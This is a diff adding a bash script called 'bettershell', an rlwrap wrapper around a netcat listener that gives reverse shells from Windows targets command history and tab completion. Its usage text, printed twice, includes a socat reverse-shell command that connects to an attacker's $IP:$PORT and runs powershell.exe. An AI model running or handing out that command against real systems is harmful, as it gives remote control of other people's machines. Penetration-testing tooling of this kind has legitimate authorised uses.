@@ -1,0 +1,33 @@
+#!/bin/bash
+echo "| |__  ___| |_| |_ ___ _ _ __| |_  ___| | |"
+echo "| '_ \/ -_)  _|  _/ -_) '_(_-< ' \/ -_) | |"
+echo "|_.__/\___|\__|\__\___|_| /__/_||_\___|_|_|"
+saved=$(stty -g)
+echo "      Windows hackers deserve better."
+if [[ $# -eq 0 ]] ; then
+    echo ""
+    echo "Usage: bettershell [NC OPTIONS]..."
+    echo "  - Bettershell uses ordinary netcat options like '-nlvp 4444'"
+    echo "  - For stderr, use included socat.exe: \"socat.exe tcp-connect:\$IP:\$PORT exec:powershell.exe,pty,stderr\""
+    echo "  - If your target is running Windows 10, consider using ConPtyShell instead for true remote Powershell API."
+    echo "  - Since tab completion works by reading server responses, 'cat'-ing huge text files should be avoided for best results."
+    echo "  - Use CTRL+R to search command history."
+    exit 0
+fi
+if [ $1 = "--help" ] || [ $1 = "-h" ] || [ $1 = "-help" ]
+then
+    echo ""
+    echo "Usage: bettershell [NC OPTIONS]..."
+    echo "  - Bettershell uses ordinary netcat options like '-nlvp 4444'"
+    echo "  - For stderr, use included socat.exe: \"socat.exe tcp-connect:\$IP:\$PORT exec:powershell.exe,pty,stderr\""
+    echo "  - If your target is running Windows 10, consider using ConPtyShell instead for true remote Powershell API."
+    echo "  - Since tab completion works by reading server responses, 'cat'-ing huge text files should be avoided for best results."
+    echo "  - Use CTRL+R to search command history."
+else
+    echo ""
+    stty intr ''
+    stty -echo
+    rlwrap -crR -b "\'\\\"," -W -pBlue --always-echo -e "" -f ~/.config/rlwrap/autocomplete.conf nc "$@"
+    stty echo
+    stty "$saved"
+fi
